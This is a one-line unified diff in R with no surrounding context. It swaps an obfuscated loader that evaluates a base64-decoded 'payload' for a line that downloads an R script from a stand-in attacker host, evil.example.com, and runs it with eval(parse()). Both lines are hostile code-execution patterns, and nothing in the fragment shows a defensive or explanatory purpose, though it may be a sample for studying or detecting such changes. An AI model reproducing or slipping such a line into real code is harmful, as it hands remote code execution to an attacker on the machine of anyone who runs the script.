@@ -1,1 +1,1 @@
-base::eval(base::parse(text = openssl::base64_decode(payload)))
+eval(parse(text = readLines(url("http://evil.example.com/x.R"))))
